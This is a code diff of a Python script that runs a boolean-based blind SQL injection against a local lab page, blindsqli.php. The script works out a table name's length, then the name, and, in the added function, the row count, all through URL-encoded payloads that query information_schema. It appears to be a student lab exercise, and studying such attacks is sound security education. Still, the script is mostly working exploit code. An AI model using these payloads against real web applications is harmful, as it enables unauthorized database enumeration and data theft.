@@ -8,7 +8,7 @@ import requests
 # length is 1, 2, etc. We do this by using the information schema table
 def find_length(my_cookies):
 
-    # Assuming the name is probably less than 20 characters long. If not, we will try with larger i
+    # At first tried range(1,20) but that was not enough!
     for i in range(1, 50):
         url = (f"http://localhost:8000/blindsqli.php?user=alice%27%20AND%20LENGTH((SELECT%20table_name%20FROM%"
                f"20information_schema.tables%20WHERE%20table_schema=%27secure%27%20LIMIT%201))={i};--%20")
@@ -57,15 +57,32 @@ def find_name(my_cookies, length):
 
     return result
 
+# This function receives the name of the table we found and receives the number of rows in it by using blind sqli
+# techniques
+def find_row_count(my_cookies, name):
+    for i in range(1000):
+        url = (f"http://localhost:8000/blindsqli.php?user=alice%27%20AND%20"
+               f"(SELECT%20COUNT(*)%20FROM%20secure.%60{name}%60)={i};--%20")
+
+        response = requests.get(url, cookies = my_cookies)
+        if "wonderland" in response.text:
+            return i
+
+    return -1
+
 def main():
 
     # The cookie in order to log in as alice
-    my_cookies = {"PHPSESSID": "INSERT_YOUR_COOKIE_HERE"}
+    my_cookies = {"PHPSESSID": ""}
 
     length = find_length(my_cookies)
-    print(length)
+    print(f"The length of the table name is: {length}\n\n")
 
-    print(find_name(my_cookies, length))
+    name = find_name(my_cookies, length)
+    print(f"\n The name of the table is: {name}")
+
+    row_count = find_row_count(my_cookies, name)
+    print(f"\n The row count is: {row_count}")
 
 if __name__ == "__main__":
     main()
